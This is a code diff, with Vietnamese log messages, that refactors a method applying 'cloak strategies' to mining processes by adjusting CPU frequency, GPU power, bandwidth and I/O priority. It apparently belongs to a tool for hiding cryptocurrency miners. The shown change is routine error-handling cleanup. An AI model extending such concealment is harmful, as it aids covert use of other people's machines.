@@ -280,55 +280,26 @@ class SharedResourceManager:
 
     def apply_cloak_strategy(self, strategy_name: str, process: MiningProcess):
         try:
-            self.logger.debug(
-                f"Tạo strategy {strategy_name} cho {process.name} (PID={process.pid})"
-            )
+            self.logger.debug(f"Tạo strategy {strategy_name} cho {process.name} (PID={process.pid})")
             strategy = CloakStrategyFactory.create_strategy(
                 strategy_name,
                 self.config,
                 self.logger,
                 self.is_gpu_initialized()
             )
-        except Exception as e:
-            self.logger.error(f"Không thể tạo strategy {strategy_name}: {e}\n{traceback.format_exc()}")
-            raise
-
-        if not strategy:
-            msg = f"Strategy {strategy_name} không tạo thành công cho {process.name}."
-            self.logger.warning(msg)
-            raise RuntimeError(msg)
-
-        try:
+            
+            if not strategy or not hasattr(strategy, 'apply') or not callable(strategy.apply):
+                raise TypeError(f"Invalid strategy: {strategy}")
+            
             adjustments = strategy.apply(process)
             if adjustments:
                 self.logger.info(
                     f"Áp dụng {strategy_name} => {adjustments} cho {process.name} (PID={process.pid})."
                 )
-                pid = process.pid
-                if pid not in self.original_resource_limits:
-                    self.original_resource_limits[pid] = {}
-
-                # Lưu giới hạn gốc
-                for key, _value in adjustments.items():
-                    if key == 'cpu_freq':
-                        orig_freq = self.get_current_cpu_frequency(pid)
-                        self.original_resource_limits[pid]['cpu_freq'] = orig_freq
-                    elif key == 'gpu_power_limit':
-                        orig_pwr = self.get_current_gpu_power_limit(pid)
-                        self.original_resource_limits[pid]['gpu_power_limit'] = orig_pwr
-                    elif key == 'network_bandwidth_limit_mbps':
-                        orig_bw = self.get_current_network_bandwidth_limit(pid)
-                        self.original_resource_limits[pid]['network_bandwidth_limit_mbps'] = orig_bw
-                    elif key == 'ionice_class':
-                        orig_ionice = self.get_current_ionice_class(pid)
-                        self.original_resource_limits[pid]['ionice_class'] = orig_ionice
-                    # ... Lưu thêm nếu cần
-
                 self.execute_adjustments(adjustments, process)
             else:
                 self.logger.warning(
-                    f"Không có điều chỉnh cho strategy {strategy_name} "
-                    f"với tiến trình {process.name} (PID={process.pid})."
+                    f"Không có điều chỉnh cho strategy {strategy_name} với tiến trình {process.name} (PID={process.pid})."
                 )
         except Exception as e:
             self.logger.error(
